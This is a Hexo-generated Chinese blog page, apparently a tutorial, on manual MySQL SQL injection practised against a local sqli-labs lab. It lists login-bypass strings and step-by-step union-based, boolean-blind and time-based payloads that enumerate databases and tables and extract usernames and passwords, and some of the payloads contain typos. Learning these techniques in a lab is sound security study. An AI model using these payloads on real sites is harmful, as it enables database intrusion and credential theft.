@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>sql注入(一) | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="sql注入漏洞，主要介绍有以下几种">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入(一)">
+<meta property="og:url" content="http://yoursite.com/2019/04/11/sql注入/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="sql注入漏洞，主要介绍有以下几种">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/img/lianhe1.png">
+<meta property="og:image" content="http://yoursite.com/img/lianhe2.png">
+<meta property="og:image" content="http://yoursite.com/img/lianhe3.png">
+<meta property="og:image" content="http://yoursite.com/img/lianhe4.png">
+<meta property="og:image" content="http://yoursite.com/img/lianhe5.png">
+<meta property="og:image" content="http://yoursite.com/img/lianhe6.png">
+<meta property="og:image" content="http://yoursite.com/img/lianhe7.png">
+<meta property="og:image" content="http://yoursite.com/img/lianhe8.png">
+<meta property="og:image" content="http://yoursite.com/img/blind1.png">
+<meta property="og:image" content="http://yoursite.com/img/blind2.png">
+<meta property="og:image" content="http://yoursite.com/img/blind3.png">
+<meta property="og:image" content="http://yoursite.com/img/blind4.png">
+<meta property="og:image" content="http://yoursite.com/img/bilnd5.png">
+<meta property="og:image" content="http://yoursite.com/img/ASCII.jpg">
+<meta property="og:updated_time" content="2019-04-14T10:12:21.505Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sql注入(一)">
+<meta name="twitter:description" content="sql注入漏洞，主要介绍有以下几种">
+<meta name="twitter:image" content="http://yoursite.com/img/lianhe1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-sql注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/04/11/sql注入/" class="article-date">
+  <time datetime="2019-04-11T11:09:48.000Z" itemprop="datePublished">2019-04-11</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      sql注入(一)
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="sql注入漏洞，主要介绍有以下几种"><a href="#sql注入漏洞，主要介绍有以下几种" class="headerlink" title="sql注入漏洞，主要介绍有以下几种"></a>sql注入漏洞，主要介绍有以下几种</h1><a id="more"></a>
+<hr>
+<ul>
+<li><p>5.0mysql数据库特性</p>
+</li>
+<li><p>手工注入一般步骤</p>
+</li>
+<li><p>常用的万能密码</p>
+</li>
+<li><p>联和注入</p>
+</li>
+<li><p>基于布尔的盲注</p>
+</li>
+<li><p>基于时间的盲注</p>
+<hr>
+<h1 id="5-0mysql数据库特性"><a href="#5-0mysql数据库特性" class="headerlink" title="5.0mysql数据库特性"></a>5.0mysql数据库特性</h1><p><strong>information _schema</strong></p>
+<p>自带，系统库，汇总（其他数据库的库名，表名，字段名）**</p>
+<p> <strong>table_schema 其他数据库的库名</strong></p>
+<p><strong>table_name  其他数据库表名</strong></p>
+<p><strong>column_name 字段名</strong></p>
+</li>
+</ul>
+<h1 id="手工注入一般步骤"><a href="#手工注入一般步骤" class="headerlink" title="手工注入一般步骤"></a>手工注入一般步骤</h1><p>​    step 1  :判断是否有注入点  ‘（判断凑个后台数据库中农选取的列数，判断那几列在前段显示） </p>
+<p>​      <strong>step  2: 收集数据库信息（用户名  版本，当前数据库名等等）</strong></p>
+<p>​      <strong>step  3:获取当前数据库下所有的表名</strong></p>
+<p>​      <strong>step  4:获取当前数据库下制定表中的字段名</strong></p>
+<p>​      <strong>step  5:获取字段对应的数据</strong></p>
+<p>​      <strong>step  6:破解数据库，**</strong>提权，内网渗透  （找后台  admin  admin.php admin_login.php）<strong>*</strong></p>
+<p>常用我常用万能密码</p>
+<p><strong>万能密码：利用sql注入漏洞，提交恶意的数据（在用户名出提交含有恶意的功能的sql数据 ）</strong> </p>
+<p><strong>select * from  news  where  tid=0  or  1=1;(用真现实所有信息)</strong></p>
+<p>​                                                                                                         </p>
+<p><strong>用户名：1‘ or  1=1#</strong></p>
+<p><strong>密码：123</strong></p>
+<p><strong>用户名：1‘ or  ‘a’=’a’#</strong></p>
+<p><strong>密码：123</strong></p>
+<h1 id="联和注入（union）"><a href="#联和注入（union）" class="headerlink" title="联和注入（union）"></a>联和注入（union）</h1><p>step1.判断注入点</p>
+<p><a href="http://127.0.0.1/sqli-labs-master/Less-1/?id=1" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs-master/Less-1/?id=1</a> </p>
+<p><img src="/img/lianhe1.png" alt="lianhe1"></p>
+<p>确定列数和位置（显错、显示数据）</p>
+<p>​    <a href="http://127.0.0.1/sqli-labs-master/Less-1/?id=1" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs-master/Less-1/?id=1</a> ‘ order by 4 –+</p>
+<p>order by 后变动数字，根据页面显示效果判断列数 3 </p>
+<p> <img src="/img/lianhe2.png" alt="lianhe2"></p>
+<p>​    <strong><a href="http://127.0.0.1/sqli-labs-master/Less-1/?id=-1" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1</a> ‘+UNION+ALL+SELECT+1,2,3–+</strong></p>
+<p>​    <strong>union select 后跟3个数字，同时要把typeid=1 对应的结果屏蔽掉</strong> </p>
+<p><img src="/img/lianhe3.png" alt="lianhe3"></p>
+<p>​    <strong>step 2：收集信息</strong></p>
+<p>​    <strong>所有数据库</strong></p>
+<p><a href="http://127.0.0.1/sqli-labs-master/Less-1/?id=-1" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1</a> ‘+UNION+ALL+SELECT+1,(select group_concat(distinct table_schema)  from information_schema.columns),3–+**</p>
+<p><img src="/img/lianhe4.png" alt="lianhe4"></p>
+<p>​    <strong>当前数据库</strong></p>
+<p>​    <a href="http://127.0.0.1/sqli-labs-master/Less-1/?id=-1" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1</a> ‘+UNION+ALL+SELECT+1,(database()),3–+</p>
+<p>​    <strong>数据库版本</strong></p>
+<p>​    <strong>version()</strong></p>
+<p><a href="http://127.0.0.1/sqli-labs-master/Less-1/?id=-1" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1</a> ‘+UNION+ALL+SELECT+1,(version()),3–+</p>
+<p><img src="/img/lianhe5.png" alt="lianhe5"></p>
+<p>​    <strong>用户</strong></p>
+<p>​    <strong>user()</strong></p>
+<p>​    <strong>临时文件夹</strong></p>
+<p>​    <strong>@@tmpdir</strong></p>
+<p>​    <strong>数据库文件所在的位置</strong></p>
+<p>​    <strong>@@datadir</strong></p>
+<p><strong>step 3:获取当前数据库下表名</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1 &apos;+UNION+ALL+SELECT+1,(select group_concat(distinct table_name)  from information_schema.columns  where table_schema=database()),3--+</span><br></pre></td></tr></table></figure>
+<p><img src="/img/lianhe6.png" alt="lianhe6"></p>
+<p><strong>step 4:获取当前数据库下指定表的字段名</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1 &apos;+UNION+ALL+SELECT+1,(select group_concat(distinct column_name ) from information_schema.columns where table_schema=database() and table_name=0x7573657273),3--+</span><br></pre></td></tr></table></figure>
+<p><img src="/img/lianhe7.png" alt="lianhe7"></p>
+<p><strong>step 5:获取字段数据</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1 &apos;+UNION+ALL+SELECT+1,(select concat_ws(0x7e,username,password) from users limit 0,1),3--+</span><br></pre></td></tr></table></figure>
+<p><img src="/img/lianhe8.png" alt="lianhe8"></p>
+<h1 id="基于布尔的盲注探测"><a href="#基于布尔的盲注探测" class="headerlink" title="基于布尔的盲注探测"></a><strong>基于布尔的盲注探测</strong></h1><p>​      <strong>step  1:探测注入点</strong>  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&apos;  1&apos;  and  1=1 #  /1 &apos;and &apos;1&apos;=&apos;1&apos;#**</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1</span><br></pre></td></tr></table></figure>
+<p><img src="/img/blind1.png" alt="blind1"></p>
+<p>​      <strong>step 2收集数据信息 （当前数据库）</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1 &apos;and length(user())=5 23%</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1 &apos; and ascii(substr(user(),1,1))=114 %23</span><br></pre></td></tr></table></figure>
+<p>​    <strong>用户名第一个字符是r</strong></p>
+<p>​     <img src="/img/blind2.png" alt="blind2"></p>
+<p> <strong>step3 查询当前数据库</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&apos; and ascii(substr((select distinct table_name from information_schema.columns where table_schema=database()limit 0,1)1,1))=100%23</span><br></pre></td></tr></table></figure>
+<p>​     <img src="/img/blind3.png" alt="blind3"></p>
+<p><strong>step 4 查询表名</strong> </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&apos; and ascii(substr((select distinct column_name from information_schema.columns where table_name=user limit 0,1)1,1))=100 %23</span><br></pre></td></tr></table></figure>
+<p>  <img src="/img/blind4.png" alt="blind4"></p>
+<p>  <strong>step 5  获取字段名字</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&apos; and ascii(substr((select         concat(username,0x3a,password)  from users  limit 0,1)1,1))=68 %23</span><br></pre></td></tr></table></figure>
+<p>​    <img src="/img/bilnd5.png" alt="bilnd5"></p>
+<p><strong>step 6破解密码</strong></p>
+<p><img src="/img/ASCII.jpg" alt="ASCII"></p>
+<h1 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a><strong>基于时间的盲注</strong></h1><h3 id="sleep-函数介绍："><a href="#sleep-函数介绍：" class="headerlink" title="sleep()函数介绍："></a>sleep()函数介绍：</h3><p>​    <strong>sleep() benchmark() 要与条件类函数配置使用</strong></p>
+<p>​    <strong>sleep(参数) 参数直接写以秒为单位的时间数字  sleep(5)</strong> </p>
+<p>​    <strong>benchmark(参数1，参数2) 参数1 表示执行某项操作的次数  参数2 某项操作，函数或者表达式</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select if(length(user())&gt;4,benchmark(5000000,md5(&apos;abc&apos;)),&apos;bye&apos;)**</span><br></pre></td></tr></table></figure>
+<p><strong>实验操作：</strong></p>
+<h4 id="step-1-：找注入点"><a href="#step-1-：找注入点" class="headerlink" title="step 1 ：找注入点"></a>step 1 ：找注入点</h4><p><a href="http://127.0.0.1/sqli-labs-master/Less-10/?id=1&#39;and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))--+" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs-master/Less-10/?id=1&#39;and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))--+</a> </p>
+<h4 id="step-2：收集数据库信息"><a href="#step-2：收集数据库信息" class="headerlink" title="step 2：收集数据库信息"></a>step 2：收集数据库信息</h4><h6 id="当前数据库长度："><a href="#当前数据库长度：" class="headerlink" title="*当前数据库长度："></a>*当前数据库长度：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-10/?id=1&apos;and select \*  from users where id=1 and select if(length（database()）=4,sleep(5),&apos;bye&apos;);</span><br></pre></td></tr></table></figure>
+<p>探测数据库名的每个字符：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select \*  from users where id=1 and select if(ascii(subtring(database(),1,1))=107,1,sleep(5))；</span><br></pre></td></tr></table></figure>
+<h4 id="step-3-获取数据库中的表"><a href="#step-3-获取数据库中的表" class="headerlink" title="step 3:获取数据库中的表"></a>step 3:获取数据库中的表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select \*  from users where id=1 and select if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;100,1,sleep(5));</span><br></pre></td></tr></table></figure>
+<h4 id="step-4-获取字段名"><a href="#step-4-获取字段名" class="headerlink" title="step 4:获取字段名"></a>step 4:获取字段名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select \*  from users where id=1 and select if((ascii(substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),1,1)))&gt;100,1,sleep(5));</span><br></pre></td></tr></table></figure>
+<h4 id="step-5：获取字段内容"><a href="#step-5：获取字段内容" class="headerlink" title="step 5：获取字段内容"></a>step 5：获取字段内容</h4><p>​    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select \*  from users where id=1 and select if((ascii(substr(( select password from users limit 0,1),1,1)))=68,1,sleep(5));</span><br></pre></td></tr></table></figure>
+<h4 id="step6-破解密码"><a href="#step6-破解密码" class="headerlink" title="step6:破解密码"></a>step6:破解密码</h4>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/04/11/sql注入/" data-id="cjv2e6o4o0007nwwfk4z00fqr" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/04/14/sql注入-二/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          sql注入(二)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/04/08/msf浏览器自动攻击/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">msf浏览器自动攻击</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/04/29/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/28/一句话木马及变形/">一句话木马及变形</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/28/文件上传的七种姿势/">文件上传的七种姿势</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/15/DNSLOG在盲注中的使用/">DNSLOG在盲注中的使用</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/14/sql注入-二/">sql注入(二)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
